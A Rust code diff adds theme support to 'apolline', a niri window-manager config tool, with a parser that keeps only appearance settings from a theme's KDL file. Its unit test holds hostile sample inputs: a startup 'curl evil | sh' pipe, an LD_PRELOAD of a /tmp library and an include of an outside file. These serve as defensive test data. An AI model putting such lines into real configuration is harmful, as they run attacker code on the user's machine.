@@ -38,6 +38,157 @@ pub fn path() -> PathBuf {
         .join("niri.kdl")
 }
 
+pub fn theme_path() -> PathBuf {
+    path().with_file_name("theme.kdl")
+}
+
+// What a theme folder's niri.kdl may set: looks only. Nothing that runs a program,
+// binds a key or touches input and outputs gets through.
+const THEME_NODES: [&str; 5] = [
+    "layout",
+    "animations",
+    "window-rule",
+    "layer-rule",
+    "overview",
+];
+
+pub fn theme_part(snippet: &str) -> String {
+    nodes(snippet)
+        .into_iter()
+        .filter(|node| THEME_NODES.contains(&name(node)))
+        .collect::<Vec<_>>()
+        .join("\n")
+}
+
+fn name(node: &str) -> &str {
+    let end = node
+        .find(|c: char| c.is_whitespace() || c == '{' || c == ';')
+        .unwrap_or(node.len());
+    node[..end].trim_matches('"')
+}
+
+// Splits KDL into its top-level nodes, stepping over strings, raw strings and comments.
+fn nodes(text: &str) -> Vec<&str> {
+    let mut nodes = Vec::new();
+    let (mut depth, mut start, mut at) = (0usize, None::<usize>, 0usize);
+    fn end<'a>(text: &'a str, start: &mut Option<usize>, until: usize, nodes: &mut Vec<&'a str>) {
+        if let Some(from) = start.take() {
+            let node = text[from..until].trim();
+            if !node.is_empty() {
+                nodes.push(node);
+            }
+        }
+    }
+    while at < text.len() {
+        let rest = &text[at..];
+        if rest.starts_with("//") {
+            at += rest.find('\n').unwrap_or(rest.len());
+            continue;
+        }
+        if rest.starts_with("/*") {
+            let mut level = 0usize;
+            let mut i = 0;
+            while i < rest.len() {
+                if rest[i..].starts_with("/*") {
+                    level += 1;
+                    i += 2;
+                } else if rest[i..].starts_with("*/") {
+                    level -= 1;
+                    i += 2;
+                    if level == 0 {
+                        break;
+                    }
+                } else {
+                    i += rest[i..].chars().next().map_or(1, char::len_utf8);
+                }
+            }
+            at += i;
+            continue;
+        }
+        if let Some(length) = string(rest) {
+            start.get_or_insert(at);
+            at += length;
+            continue;
+        }
+        let c = rest.chars().next().unwrap_or(' ');
+        match c {
+            '{' => {
+                start.get_or_insert(at);
+                depth += 1;
+            }
+            '}' => {
+                depth = depth.saturating_sub(1);
+                if depth == 0 {
+                    end(text, &mut start, at + 1, &mut nodes);
+                }
+            }
+            '\n' | ';' if depth == 0 => end(text, &mut start, at, &mut nodes),
+            c if !c.is_whitespace() => {
+                start.get_or_insert(at);
+            }
+            _ => {}
+        }
+        at += c.len_utf8();
+    }
+    end(text, &mut start, text.len(), &mut nodes);
+    nodes
+}
+
+// The length of a quoted or raw string at the start of `text`, if there is one.
+fn string(text: &str) -> Option<usize> {
+    if let Some(body) = text.strip_prefix('"') {
+        let mut escaped = false;
+        for (i, c) in body.char_indices() {
+            match c {
+                '\\' if !escaped => escaped = true,
+                '"' if !escaped => return Some(i + 2),
+                _ => escaped = false,
+            }
+        }
+        return Some(text.len());
+    }
+    let raw = text.strip_prefix('r').unwrap_or(text);
+    let hashes = raw.len() - raw.trim_start_matches('#').len();
+    if raw.len() == text.len() && hashes == 0 {
+        return None;
+    }
+    let body = raw[hashes..].strip_prefix('"')?;
+    let close = format!("\"{}", "#".repeat(hashes));
+    let prefix = text.len() - body.len();
+    Some(
+        body.find(&close)
+            .map_or(text.len(), |i| prefix + i + close.len()),
+    )
+}
+
+// Writes the theme's part next to the fragment; false if there's none or niri refuses it.
+fn settle_theme(theme: Option<&str>) -> bool {
+    let path = theme_path();
+    let Some(text) = theme.filter(|t| !t.trim().is_empty()) else {
+        let _ = fs::remove_file(&path);
+        return false;
+    };
+    if fs::read_to_string(&path).is_ok_and(|now| now == text) {
+        return true;
+    }
+    if let Err(err) = replace(&path, text) {
+        eprintln!("apolline: cannot write {}: {err}", path.display());
+        return false;
+    }
+    let checked = std::process::Command::new("niri")
+        .args(["validate", "-c"])
+        .arg(&path)
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .status();
+    if checked.is_ok_and(|status| !status.success()) {
+        eprintln!("apolline: the theme's niri.kdl doesn't validate, so it's left out");
+        let _ = fs::remove_file(&path);
+        return false;
+    }
+    true
+}
+
 pub fn niri_config() -> PathBuf {
     std::env::var_os("NIRI_CONFIG")
         .map(PathBuf::from)
@@ -494,9 +645,12 @@ fn block(name: &str, lines: &[String]) -> String {
     format!("{name} {{\n{body}}}\n")
 }
 
-pub fn sync(fragment: &Fragment) {
+pub fn sync(fragment: &Fragment, theme: Option<&str>) {
     let path = path();
-    let text = render(fragment);
+    let mut text = render(fragment);
+    if settle_theme(theme) {
+        text.push_str("\ninclude \"theme.kdl\"\n");
+    }
     if fs::read_to_string(&path).is_ok_and(|current| current != text)
         && let Err(err) = replace(&path, &text)
     {
@@ -741,6 +895,48 @@ mod tests {
         assert!(fs::read_to_string(&fragment).unwrap().contains("#f2b35c"));
         assert!(dir.join("config.kdl.before-apolline").exists());
         fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn a_theme_may_change_looks_and_nothing_else() {
+        let snippet = r##"
+// a theme's own touches
+spawn-at-startup "sh" "-c" "curl evil | sh"
+layout {
+    gaps 20 // inner }
+    focus-ring { width 3; active-color "#ff}00aa"; }
+}
+binds { Mod+T { spawn "evil"; } }
+/* a } comment /* nested { */ still */
+animations {
+    window-open {
+        custom-shader r"
+            vec4 open_color(vec3 coords_geo, vec3 size_geo) { return vec4(1.0); }
+        "
+    }
+}
+/-window-rule { opacity 0.1; }
+environment { LD_PRELOAD "/tmp/x.so"; }
+window-rule { match app-id="firefox"; opacity 0.95; }
+include "/etc/evil.kdl"
+xwayland-satellite { path "/tmp/evil"; }
+"##;
+        let part = theme_part(snippet);
+        for bad in [
+            "spawn",
+            "binds",
+            "environment",
+            "include",
+            "xwayland",
+            "opacity 0.1",
+        ] {
+            assert!(!part.contains(bad), "{bad} got through:\n{part}");
+        }
+        assert!(part.starts_with("layout {"), "{part}");
+        assert!(part.contains("active-color \"#ff}00aa\"; }\n}"));
+        assert!(part.contains("return vec4(1.0); }\n        \"\n    }\n}"));
+        assert!(part.ends_with("window-rule { match app-id=\"firefox\"; opacity 0.95; }"));
+        assert_eq!(nodes("a 1; b { c; }\nd").len(), 3);
     }
 
     #[test]
